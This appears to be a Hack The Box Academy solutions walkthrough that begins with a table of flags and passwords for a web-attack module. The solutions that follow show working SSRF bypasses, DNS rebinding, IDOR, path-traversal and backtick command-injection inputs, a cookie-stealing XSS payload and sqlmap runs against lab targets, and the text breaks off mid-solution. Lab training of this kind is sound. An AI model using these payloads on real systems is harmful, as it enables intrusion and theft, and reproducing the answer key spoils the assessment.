| Section                           | Question Number | Answer                                |
| --------------------------------- | --------------- | ------------------------------------- |
| SSRF Basic Filter Bypasses        | Question 1      | HTB{3f313d989c51198a337bef64314ba77b} |
| DNS Rebinding: SSRF Filter Bypass | Question 1      | HTB{74310d22cfecb70c4d4c39b16080abec} |
| Second-Order IDOR (Whitebox)      | Question 1      | HTB{45a12ce9dfef6556925462060658f517} |
| Second-Order IDOR (Blackbox)      | Question 1      | HTB{b2d25c5759a502c96251b80706198543} |
| Second-Order LFI                  | Question 1      | HTB{c67d672fab29ed2c89d29dca1ec4c280} |
| Second-Order Command Injection    | Question 1      | HTB{6c6cf41f4ce9c575b9d3fd55b924e14a} |
| WebSocket Analysis in Burp        | Question 1      | HTB{0c6ef05500b48406eaf3031e18035464} |
| Exploiting XSS via WebSockets     | Question 1      | HTB{2ca1d602f8a1a8439fd6a832a96e4f89} |
| Exploiting SQLi via WebSockets    | Question 1      | HTB{1251ef9b34342f62db6044190f5b83cd} |
| Skills Assessment                 | Question 1      | HTB{1251ef9b34342f62db6044190f5b83cd} |
| Skills Assessment                 | Question 2      | HTB\_@cad3my\_Stdnt!                  |
| Skills Assessment                 | Question 3      | AdM1N@v@uL1                           |
| Skills Assessment                 | Question 4      | HTB{994c44577021f06eadcc1fe43c9ca49f} |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# SSRF Basic Filter Bypasses

## Question 1

### "Bypass the SSRF filter to obtain the flag. NOTE: the client only provides access to the staging environment of the web application, which is located behind a firewall that blocks all outgoing web requests."

After spawning the target machine, students first need to download [src\_ssrf\_filter\_bypass.zip](https://academy.hackthebox.com/storage/modules/231/src_ssrf_filter_bypass.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/231/src_ssrf_filter_bypass.zip
unzip src_ssrf_filter_bypass.zip
```

```shell
┌─[eu-academy-1]─[10.10.14.148]─[htb-ac-413848@htb-bus5tou0zu]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/231/src_ssrf_filter_bypass.zip
unzip src_ssrf_filter_bypass.zip

--2023-10-09 14:55:22--  https://academy.hackthebox.com/storage/modules/231/src_ssrf_filter_bypass.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:157e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
<SNIP>
```

When analyzing `src/server.py`, students will notice that it is a `Flask` web application that allows clients to download files given a URL by providing two routes, `/` (lines 7-20) and `/flag` (lines 22-27).

The latter route downloads the file `flag.txt` from the web server's filesystem; however, students cannot (ab)use it since it utilizes the [request.remote\_addr](https://flask.palletsprojects.com/en/3.0.x/api/#flask.Request.remote_addr) function to assure that the request's remote address is `127.0.0.1`:

Code: python

```python
@app.route('/flag')
def flag():
    # only allow access from localhost
    if request.remote_addr != '127.0.0.1':
			return 'Unauthorized!', 401
    return send_file('./flag.txt')
```

The former route allows GET and POST requests, returning "index.html" for GET ones; however, for POST ones, it invokes `download_file` against the `url` POST parameter:

Code: python

```python
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'GET':
        return render_template('index.html')
   
    try:
        file = download_file(request.form.get('url'))
    except Exception as e:
        return f'Error: {e}', 400

    return Response(
        file,
        mimetype='text/plain',
        headers={'Content-disposition': 'attachment; filename=download.file'})
```

The `download_file` function (lines 30-46) performs some checks on the passed URL and then calls `check_domain` against the parsed domain (line 32):

Code: python

```python
def download_file(url):
    scheme = urlparse(url).scheme
    domain = urlparse(url).hostname

    if not domain or not scheme:
        raise Exception('Malformed URL')
        
    if scheme not in ['http', 'https']:
        raise Exception('Invalid scheme')

    if not check_domain(domain):
        raise Exception('URL not allowed')

    # no redirects
    r = requests.get(url, allow_redirects=False)

    return r.text
```

The `check_domain` (lines 49-59) function returns `True` only if [is\_loopback](https://docs.python.org/3/library/ipaddress.html#ipaddress.IPv4Address.is_loopback) returns `False` on the IP address from the resolved domain:

Code: python

```python
def check_domain(domain):
    try:
        # resolve domain
        ip = socket.gethostbyname(domain)

        # prevent access to localhost
        return not ipaddress.ip_address(ip).is_loopback
    except:
        pass

    return False
```

However, `is_loopback` does not consider `0.0.0.0` as a loopback address (which includes all IPv4 addresses on a local machine, including `127.0.0.1`). Therefore, students need to abuse this default behavior by sending a POST request with the `url` POST parameter having `0.0.0.0` (or `0` alone) for the domain and `/flag` for the path; students will attain the flag `HTB{3f313d989c51198a337bef64314ba77b}`:

Code: shell

```shell
curl -s -X POST http://STMIP:STMPO/ -d 'url=http://0.0.0.0/flag'
```

```shell
┌─[eu-academy-1]─[10.10.14.148]─[htb-ac-413848@htb-gkiymvgowl]─[~]
└──╼ [★]$ curl -s -X POST http://83.136.252.24:48103/ -d 'url=http://0.0.0.0/flag'

HTB{3f313d989c51198a337bef64314ba77b}
```

Answer: `HTB{3f313d989c51198a337bef64314ba77b}`

# DNS Rebinding: SSRF Filter Bypass

## Question 1

### "What is the flag value located at the /flag endpoint in the webapp?"

After spawning the target machine, students need to follow along with the section to exploit the web application. First, students need to navigate to `STMIP:10000` and sign in to the `Webmin` portal using the username `admin` and a blank password:

![[HTB Solutions/CWEE/z. images/5816342d2af90ca5d7d89a8770119b57_MD5.jpg]]

Subsequently, students need to navigate to `Networking` ---> `Network Configuration` ---> `Hostname and DNS Client`:

![[HTB Solutions/CWEE/z. images/976109bce457929e58cf151e1deb292a_MD5.jpg]]

For the `DNS servers` field under `DNS Client Options`, students need to set its value to be that of the interface `tun0`:

Code: shell

```shell
ip -o -4 a show tun0 | cut -d " " -f 7
```

```shell
┌─[eu-academy-1]─[10.10.14.148]─[htb-ac-413848@htb-gkiymvgowl]─[~]
└──╼ [★]$ ip -o -4 a show tun0 | cut -d " " -f 7

10.10.14.148/23
```

![[HTB Solutions/CWEE/z. images/716041b7aad22736773aa8b309aff379_MD5.jpg]]

Afterward, students need to install [DNSrebinder](https://github.com/mogwailabs/DNSrebinder.git) to be able to perform the DNS rebinding attack:

Code: shell

```shell
git clone https://github.com/mogwailabs/DNSrebinder.git
cd DNSrebinder/
python3 -m venv DNSrebinder
source DNSrebinder/bin/activate
pip3 install -r requirements.txt
```

```shell
┌─[eu-academy-1]─[10.10.14.148]─[htb-ac-413848@htb-gkiymvgowl]─[~]
└──╼ [★]$ git clone https://github.com/mogwailabs/DNSrebinder.git
cd DNSrebinder/
python3 -m venv DNSrebinder
source DNSrebinder/bin/activate
pip3 install -r requirements.txt

Cloning into 'DNSrebinder'...
remote: Enumerating objects: 37, done.
remote: Counting objects: 100% (37/37), done.
<SNIP>
```

Using `dnsrebinder.py`, students need to start a DNS server and make it resolve a domain name (`google.com` used here) to `1.1.1.1` for the first request and then to `127.0.0.1` for any subsequent ones:

Code: shell

```shell
sudo python3 dnsrebinder.py --domain google.com --ip 1.1.1.1 --rebind 127.0.0.1 --counter 1 --tcp --udp
```

```shell
(DNSrebinder) ┌─[eu-academy-1]─[10.10.14.148]─[htb-ac-413848@htb-gkiymvgowl]─[~/DNSrebinder]
└──╼ [★]$ sudo python3 dnsrebinder.py --domain google.com --ip 1.1.1.1 --rebind 127.0.0.1 --counter 1 --tcp --udp

Starting nameserver...
UDP server loop running in thread: Thread-1
TCP server loop running in thread: Thread-2
```

With the rogue DNS server running, students need to visit the root webpage of the spawned target machine and "search" for a URL that uses the domain name supplied to `dnsrebinder.py` in addition to the `/flag` path:

![[HTB Solutions/CWEE/z. images/2c9c6bb3c12537ff526c4c63683dacb1_MD5.jpg]]

As explained in the module's section, because the web application resolves the domain twice, the first DNS `A` record will map `google.com` to `1.1.1.1`, while the second maps it to `127.0.0.1`; students can view the output of `dnsrebinder.py` to view the `A` records the fake DNS server replies with:

```shell
(DNSrebinder) ┌─[eu-academy-1]─[10.10.14.148]─[htb-ac-413848@htb-igdhdh9zci]─[~/DNSrebinder]
└──╼ [★]$ sudo python3 dnsrebinder.py --domain google.com --ip 1.1.1.1 --rebind 127.0.0.1 --counter 1 --tcp --udp

Starting nameserver...
UDP server loop running in thread: Thread-1
TCP server loop running in thread: Thread-2
Got a request for google.com. Type: A
------------------------ Counter for host  google.com.   1
---- Reply:
 ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 51066
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
;; QUESTION SECTION:
;google.com.                    IN      A
;; ANSWER SECTION:
google.com.             0       IN      A       1.1.1.1
Got a request for google.com. Type: A
------------------------ Counter for host  google.com.   2
---- Reply:
 ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 52047
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
;; QUESTION SECTION:
;google.com.                    IN      A
;; ANSWER SECTION:
google.com.             0       IN      A       127.0.0.1
```

Students will attain the flag `HTB{74310d22cfecb70c4d4c39b16080abec}`:

![[HTB Solutions/CWEE/z. images/67a5f3ae7f807e5f27b399e43d6fdc83_MD5.jpg]]

Answer: `HTB{74310d22cfecb70c4d4c39b16080abec}`

# Second-Order IDOR (Whitebox)

## Question 1

### "Exploit the second-order IDOR vulnerability to obtain the flag."

After spawning the target machine, students first need to install [src\_IDOR.zip](https://academy.hackthebox.com/storage/modules/231/src_IDOR.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/231/src_IDOR.zip
unzip src_IDOR.zip
```

```shell
┌─[eu-academy-1]─[10.10.14.148]─[htb-ac-413848@htb-igdhdh9zci]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/231/src_IDOR.zip
unzip src_IDOR.zip

--2023-05-10 04:40:34--  https://academy.hackthebox.com/storage/modules/231/src_IDOR.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
<SNIP>
```

Before analyzing the source code, students will notice that when signing in using the credentials `htb-stdnt:Academy_student!`, the web application allows viewing files by passing a number for the URL parameter `id` to `/get_display.php`:

![[HTB Solutions/CWEE/z. images/df16e767606d864584e9391625ee6dd7_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/138386353df8a356d959a46dabb401ef_MD5.jpg]]

In case the user is allowed to view the file, the web application redirects to `display_data.php` and displays its content:

![[HTB Solutions/CWEE/z. images/3b4d87bc78606b4bec878aaf40caeb2c_MD5.jpg]]

However, if the user is not allowed, the web application redirects to `/error.php`, signs the user out, and then displays `index.html`.

After understanding the web application's functionality, students need to analyze its source code, hunting for second-order IDOR vulnerabilities.

In line 10 of `src/get_data.php`, students will notice that the web application sets the signed-in user's session `id` field to the value of the URL parameter `id` and then invokes `check_access` (found within `src/db.php`, lines 85-104) to determine whether the user is allowed to view the file's contents. If the user is allowed, it redirects to `display_data.php`; however, in case they are not, it redirects to `error.php` (where it frees all session variables by calling [session\_unset](https://www.php.net/manual/en/function.session-unset.php)):

Code: php

```php
<?php
  session_start();
  require_once ('db.php');

  if(!$_SESSION['user']){
    header("Location: index.php");
	  exit;
  }

  $_SESSION['id'] = $_GET['id'];

  if(check_access($_SESSION['id'], $_SESSION['user'])){
    header("Location: display_data.php");
	  exit;
  } else {
    header("Location: error.php");
	  exit;
  }
?>
```

In `src/display_data.php`, the web application first checks whether there is a (signed-in) user session and then fetches the contents of the file by passing the value of the `id` field within the user's session to the function `fetch_data` (lines 48-65), which has already been set in `src/get_data.php`:

Code: php

```php
<?php
  session_start();
  require_once ('db.php');

  if(!$_SESSION['user']){
    header("Location: index.php");
	  exit;
  }

  $user_data = fetch_user_data($_SESSION['user']);
  $data = fetch_data($_SESSION['id']);
?>
```

Therefore, the session variable `id` remains set to the file ID provided to `get_data.php` unless a redirection to `error.php` occurs; this enables students to access any file `id` via `get_data.php` by not following the redirection to `error.php` and instead accessing `display_data.php` directly.

To exploit this second-order IDOR vulnerability, students need to intercept a request to `/get_data.php` and change the value of `id` to 5:

![[HTB Solutions/CWEE/z. images/b910f5f9cdaeb1eb288e2dfababbed5a_MD5.jpg]]

Instead of following the redirect to `error.php`, students need to navigate to `/display_data.php` directly, attaining the flag `HTB{45a12ce9dfef6556925462060658f517}`:

![[HTB Solutions/CWEE/z. images/dbfedb9b430a22d7a897af80b9c49842_MD5.jpg]]

Answer: `HTB{45a12ce9dfef6556925462060658f517}`

# Second-Order IDOR (Blackbox)

## Question 1

### "Exploit the second-order IDOR vulnerability to obtain the flag."

After spawning the target machine, students need to navigate to the root webpage and sign in using the credentials `htb-stdnt:Academy_student!`:

![[HTB Solutions/CWEE/z. images/ac0cdbd9d8e5cb41f5935276b78de15e_MD5.jpg]]

When hovering over files under the "Select the file to display" subsection, students will notice that the web application utilizes the md5sum of the file's id (which is most probably a primary key with auto increment) for the value of the URL parameter `file`; for example, the "Lorem Ipsum" file has the value `c81e728d9d4c2f636f067f89cc14862c` for `file`, which corresponds to the number 2:

Code: shell

```shell
echo -n 2 | md5sum
```

```shell
┌─[eu-academy-1]─[10.10.14.148]─[htb-ac-413848@htb-nudamvkt2a]─[~]
└──╼ [★]$ echo -n 2 | md5sum

c81e728d9d4c2f636f067f89cc14862c
```

![[HTB Solutions/CWEE/z. images/badc0c622079db2618f078326c5f6805_MD5.jpg]]

Moreover, after viewing a file, the "Continue where you left off" subsection showcases the first few characters of the file:

![[HTB Solutions/CWEE/z. images/a443deb69b42ed7131ffaa9821a494e7_MD5.jpg]]

Thus, since the `file` URL parameter is a potential candidate to IDOR vulnerabilities, students need to generate the md5sum of the number 5, which is `e4da3b7fbbce2345d7772b0674a318d5`:

Code: shell

```shell
echo -n 5 | md5sum
```

```shell
┌─[eu-academy-1]─[10.10.14.148]─[htb-ac-413848@htb-nudamvkt2a]─[~]
└──╼ [★]$ echo -n 5 | md5sum

e4da3b7fbbce2345d7772b0674a318d5
```

Then, using `Burp`, students need to intercept the request sent to `/file.php` when viewing any already available file and alter the value of `file` to be that of the md5sum of 5:

![[HTB Solutions/CWEE/z. images/2b6add752d99c9fb52300dd9d1b60045_MD5.jpg]]

After forwarding the request, students will notice that the "Continue where you left off" subsection displays the flag `HTB{b2d25c5759a502c96251b80706198543}`:

![[HTB Solutions/CWEE/z. images/dda4e9146b1e2cb224fa68a9633004e9_MD5.jpg]]

Answer: `HTB{b2d25c5759a502c96251b80706198543}`

# Second-Order LFI

## Question 1

### "Exploit the second-order LFI vulnerability to leak the file flag owned by the user admin."

After spawning the target machine, students first need to download [src\_LFI.zip](https://academy.hackthebox.com/storage/modules/231/src_LFI.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/231/src_LFI.zip
unzip src_LFI.zip
```

```shell
┌─[eu-academy-1]─[10.10.15.72]─[htb-ac-413848@htb-0ptxut4w0g]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/231/src_LFI.zip
unzip src_LFI.zip

--2023-05-10 17:00:16--  https://academy.hackthebox.com/storage/modules/231/src_LFI.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
<SNIP>
```

Students are encouraged to perform the same source code analysis as in the module's section.

`src/edit_username.php` does not implement any preventive filters against LFI payloads when updating a user's username; moreover, the function `update_username` in `src/db.php`, does not update the file paths owned by a user when updating their username. Students need to chain these two misconfigurations to exploit a second-order LFI vulnerability.

First, students need to sign in using the credentials `htb-stdnt:Academy_student!`:

![[HTB Solutions/CWEE/z. images/66dc8e994a7881a9ae423bf24927417f_MD5.jpg]]

Subsequently, students need to change the filename of any already available file, for example, the "Loerm Ipsum" one, to "flag":

![[HTB Solutions/CWEE/z. images/e55bfc950c789a8265f8b6342c57af9e_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/c81e19f66a26fc2171a1422f62f6b112_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/a49a5bd1244cec99c28d3d7de429ae97_MD5.jpg]]

Afterward, students need to navigate to `/edit_username.php` and update the user's username to `../www/admin` instead of "htb-stdnt":

![[HTB Solutions/CWEE/z. images/8709bc121bbe12d5546b16b6b4d5dfd7_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/95af28997e6e5b516dc8642078e19bba_MD5.jpg]]

At last, when viewing the contents of the "flag" file, the vulnerable web application will fetch the file `/var/www/../www/admin/flag.txt`, and students will attain the flag `HTB{c67d672fab29ed2c89d29dca1ec4c280}`:

![[HTB Solutions/CWEE/z. images/4bb1717a243be3a9b275d78d215d10ee_MD5.jpg]]

Answer: `HTB{c67d672fab29ed2c89d29dca1ec4c280}`

# Second-Order Command Injection

## Question 1

### "Exploit the second-order command injection vulnerability to obtain the flag."

After spawning the target machine, students need to follow along the module's section and exploit the second-order command injection. First, students need to register an account by navigating to `/register`:

![[HTB Solutions/CWEE/z. images/cce9f448edbba7139875bbada7626207_MD5.jpg]]

For the "Username" field, students need to inject the command `cat /flag.txt`, surrounding it witin two backticks:

![[HTB Solutions/CWEE/z. images/e9d75b9b68b8a6c64c05242e4ec60482_MD5.jpg]]

Subsequently, students need to login:

![[HTB Solutions/CWEE/z. images/08db5f2b8e6aec299d990118537d9b94_MD5.jpg]]

With `Burp` intercepting requests, students need to logout and send the request to `Repeater`:

![[HTB Solutions/CWEE/z. images/4f959dec83298b7f2ee71348b499ecc8_MD5.jpg]]

When inspecting the response of the logout request, students will attain the flag `HTB{6c6cf41f4ce9c575b9d3fd55b924e14a}`:

![[HTB Solutions/CWEE/z. images/2e712cf52af3fb87f84d1643bc0d0a88_MD5.jpg]]

Answer: `HTB{6c6cf41f4ce9c575b9d3fd55b924e14a}`

# WebSocket Analysis in Burp

## Question 1

### "Manipulate the WebSocket traffic to obtain the flag."

After spawning the target machine, students need to download [src\_websocket\_intro.zip](https://academy.hackthebox.com/storage/modules/231/src_websocket_intro.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/231/src_websocket_intro.zip
unzip src_websocket_intro.zip -d src_websocket_intro
code src_websocket_intro/
```

```shell
┌─[eu-academy-1]─[10.10.14.158]─[htb-ac-413848@htb-kgmbhrkrz2]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/231/src_websocket_intro.zip
unzip src_websocket_intro.zip -d src_websocket_intro
code src_websocket_intro/

--2023-05-05 22:22:07--  https://academy.hackthebox.com/storage/modules/231/src_websocket_intro.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.21.126, 104.18.20.126, 2606:4700::6812:157e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.21.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
<SNIP>
```

When analyzing `server.py`, students will notice that if a message is sent to the `/admin` WebSocket endpoint containing the data `!get_admin_info`, it responds with `admin_info`, which holds the contents of `flag.txt` living on the target's filesystem:

Code: python

```python
admin_info = open('/flag.txt').read()

<SNIP>

@sock.route('/admin')
def admin(sock):
    while True:
        data = sock.receive(timeout=1)
        if data == '!get_admin_info':
            sock.send(admin_info)
<SNIP>
```

Therefore, students first need to open `Burp`'s integrated browser and navigate to the root webpage of the spawned target machine, making sure to turn `Intercept` off (to avoid forwarding intercepted requests):

![[HTB Solutions/CWEE/z. images/7ba9a058eb46c07828038f7d7d4df377_MD5.jpg]]

Subsequently, students need to send any message:

![[HTB Solutions/CWEE/z. images/7cd2c8ddfee15f85d2870b8f4cfe4a24_MD5.jpg]]

When checking the `WebSockets history` tab, students will find the WebSocket connection the web application has established; thus, they need to send it to `Repeater`:

![[HTB Solutions/CWEE/z. images/bae42706c1ea997a8c19f34ebc29d7d9_MD5.jpg]]

Afterward, students need to click on `Select WebSocket` and clone the already established one:

![[HTB Solutions/CWEE/z. images/4dee216c084eadab18f3525790ca56c6_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/2939474c406968fe63a26c850b7ddc4e_MD5.jpg]]

However, students need to edit the endpoint and utilize `/admin` instead of `/echo`:

![[HTB Solutions/CWEE/z. images/2121f0ac76251c13026f0092240e5e57_MD5.jpg]]

At last, when sending `!get_admin_info` within the WebSocket message, students will receive the flag `HTB{0c6ef05500b48406eaf3031e18035464}` in the response:

![[HTB Solutions/CWEE/z. images/2fa3ee26f9ad1338e1cdf733000b5b63_MD5.jpg]]

Alternatively, students can use [websocat](https://github.com/vi/websocat/). First, they need to download a [pre-built executable](https://github.com/vi/websocat/releases/download/v1.11.0/websocat_max.x86_64-unknown-linux-musl) and then make it executable:

Code: shell

```shell
wget https://github.com/vi/websocat/releases/download/v1.11.0/websocat_max.x86_64-unknown-linux-musl
chmod +x websocat_max.x86_64-unknown-linux-musl
```

```shell
┌─[eu-academy-1]─[10.10.14.148]─[htb-ac-413848@htb-nudamvkt2a]─[~]
└──╼ [★]$ wget https://github.com/vi/websocat/releases/download/v1.11.0/websocat_max.x86_64-unknown-linux-musl
chmod +x websocat_max.x86_64-unknown-linux-musl

--2023-05-10 07:05:29--  https://github.com/vi/websocat/releases/download/v1.11.0/websocat_max.x86_64-unknown-linux-musl
Resolving github.com (github.com)... 140.82.121.4
Connecting to github.com (github.com)|140.82.121.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
<SNIP>
```

To send data, students can use `echo` and pipe its output to `websocat`:

Code: shell

```shell
echo -n '!get_admin_info' | ./websocat_max.x86_64-unknown-linux-musl -q ws://STMIP:STMPO/admin
```

```shell
┌─[eu-academy-1]─[10.10.14.148]─[htb-ac-413848@htb-nudamvkt2a]─[~]
└──╼ [★]$ echo -n '!get_admin_info' | ./websocat_max.x86_64-unknown-linux-musl -q ws://94.237.59.185:38143/admin

HTB{0c6ef05500b48406eaf3031e18035464}
```

Answer: `HTB{0c6ef05500b48406eaf3031e18035464}`

# Exploiting XSS via WebSockets

## Question 1

### "Obtain the admin user's cookie."

After spawning the target machine, students first need to download [src\_websocket\_xss.zip](https://academy.hackthebox.com/storage/modules/231/src_websocket_xss.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/231/src_websocket_xss.zip
unzip src_websocket_xss.zip
```

```shell
┌─[eu-academy-1]─[10.10.15.72]─[htb-ac-413848@htb-igsfqtjg7s]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/231/src_websocket_xss.zip
unzip src_websocket_xss.zip

--2023-05-10 15:00:31--  https://academy.hackthebox.com/storage/modules/231/src_websocket_xss.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.21.126, 104.18.20.126, 2606:4700::6812:157e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.21.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
<SNIP>
```

Subsequently, students are encouraged to follow along with the module's section and analyze the source code of the web application's front and back end.

The backend is a Flask web app (implemented in `server.py`) that provides two WebSocket endpoints for sending messages, `/userws` (displays messages belonging to users and sends messages of users to admins) and `/adminws` (displays messages belonging to admins and sends messages of admins to users):

Code: python

```python
@sock.route('/userws')
def userws(sock):
    while True:
        if not to_user.empty():
            msg = to_user.get()
            sock.send(msg)

        msg = sock.receive(timeout=1)
        if msg:
            to_admin.put(msg)

@sock.route('/adminws')
def adminws(sock):
    while True:
        if not to_admin.empty():
            msg = to_admin.get()
            sock.send(msg)

        msg = sock.receive(timeout=1)
        if msg:
            to_user.put(msg)
```

When analyzing the front-end (inspecting the root web page's source), students will notice that it is sending messages that a user enters to the `/userws` endpoint (lines 43-67), therefore delivering them to the admin(s). The front-end passes the chat messages received from the WebSocket connection to the `log` function, which is set via the `addEventListener` call on the `socket` variable. The `log` function adds the chat message to the DOM via the `innerHTML` property without any sanitization, therefore opening avenues for XSS attacks:

Code: html

```html
document.getElementById('chat').innerHTML += \`<div class="chat-message clearfix"><div class="chat-message-content clearfix"><span class="chat-time">${time}</span><h5>${user}</h5><p>${msg}</p></div></div><hr>\`;
```

![[HTB Solutions/CWEE/z. images/689888b46baff36aea1fa8b651e90328_MD5.jpg]]

Students need to use an `event handler` XSS payload (the [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#common-payloads) repository contains plenty of them) to make the admin send their cookie using the [document.cookie](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie) property via the WebSocket connection. After sending the XSS payload, students will attain the flag `HTB{2ca1d602f8a1a8439fd6a832a96e4f89}` in a response message from the admin:

Code: html

```html
<img src="x" onerror="socket.send(document.cookie)">
```

![[HTB Solutions/CWEE/z. images/6a3020bdd37a610426e213ab4c13a19a_MD5.jpg]]

Answer: `HTB{2ca1d602f8a1a8439fd6a832a96e4f89}`

# Exploiting SQLi via WebSockets

## Question 1

### "Exploit the SQL injection vulnerability to exfiltrate the flag from the database."

After spawning the target machine, students first need to download [src\_websocket\_sqli.zip](https://academy.hackthebox.com/storage/modules/231/src_websocket_sqli.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/231/src_websocket_sqli.zip
unzip src_websocket_sqli.zip
```

```shell
┌─[eu-academy-1]─[10.10.15.72]─[htb-ac-413848@htb-w3euxoqbcl]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/231/src_websocket_sqli.zip
unzip src_websocket_sqli.zip

--2023-05-10 15:59:03--  https://academy.hackthebox.com/storage/modules/231/src_websocket_sqli.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
<SNIP>
```

As explained in the module's section, there is a SQLi vulnerabilitiy in `server.py`, line 18:

Code: python

```python
mycursor.execute(f'SELECT message FROM users WHERE username="{username}"')
```

Because the backend uses WebSockets, students need to use the `sqlmap` middleware proivded in the section to exploit this SQLi:

Code: python

```python
from flask import Flask, request
from websocket import create_connection
import json

app = Flask(__name__)

# Make sure to replace STMIP
WS_URL = 'ws://STMIP/dbconnector'

@app.route('/')
def index():
    req = {}
    req['username'] = request.args.get('username', '')

    ws = create_connection(WS_URL)
    ws.send(json.dumps(req))
    r = json.loads(ws.recv())
    ws.close()

    if r.get('error'):
        return r['error']

    return r['messages']

app.run(host='127.0.0.1', port=8000)
```

After saving it into a file, students need to run it:

Code: shell

```shell
python3 sqlmapMiddleware.py
```

```shell
┌─[eu-academy-1]─[10.10.15.72]─[htb-ac-413848@htb-0ptxut4w0g]─[~]
└──╼ [★]$ python3 sqlmapMiddleware.py

 * Serving Flask app 'sqlmapMiddleware' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on http://127.0.0.1:8000/ (Press CTRL+C to quit)
```

Subsequently, students need to run `sqlmap`, making sure to use the `--prefix` option and the value `"` for it:

Code: shell

```shell
sqlmap -u http://127.0.0.1:8000/?username=htb-stdnt --prefix='"' --batch --threads=10
```

```shell
┌─[eu-academy-1]─[10.10.15.72]─[htb-ac-413848@htb-0ptxut4w0g]─[~]
└──╼ [★]$ sqlmap -u http://127.0.0.1:8000/?username=htb-stdnt --prefix='"' --batch --threads=10
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.12#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

<SNIP>

sqlmap identified the following injection point(s) with a total of 1350 HTTP(s) requests:
---
Parameter: username (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=htb-stdnt" AND 2100=2100-- iijO

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=htb-stdnt" AND (SELECT 5692 FROM (SELECT(SLEEP(5)))OHuw)-- qISp
---
<SNIP>
```

Now that `sqlmap` confirmed the SQLi vulnerability, students need to dump the databases' names, finding `db`:

Code: shell

```shell
sqlmap -u http://127.0.0.1:8000/?username=htb-stdnt --prefix='"' --dbs --threads=10
```

```shell
┌─[eu-academy-1]─[10.10.15.72]─[htb-ac-413848@htb-0ptxut4w0g]─[~]
└──╼ [★]$ sqlmap -u http://127.0.0.1:8000/?username=htb-stdnt --prefix='"' --dbs --threads=10
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.12#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

<SNIP>

available databases [3]:
[*] db
[*] information_schema
[*] performance_schema
<SNIP>
```

Students then need to enumerate the table names of the `db` database, finding `secretdata`:

Code: shell

```shell
sqlmap -u http://127.0.0.1:8000/?username=htb-stdnt --prefix='"' --tables -D db --threads=10
```

```shell
┌─[eu-academy-1]─[10.10.15.72]─[htb-ac-413848@htb-0ptxut4w0g]─[~]
└──╼ [★]$ sqlmap -u http://127.0.0.1:8000/?username=htb-stdnt --prefix='"' --tables -D db --threads=10
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.12#stable}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

<SNIP>

Database: db
[2 tables]
+------------+
| secretdata |
| users      |
+------------+
<SNIP>
```

At last, students need to dump `secretdata`, to attain the flag `HTB{1251ef9b34342f62db6044190f5b83cd}`:

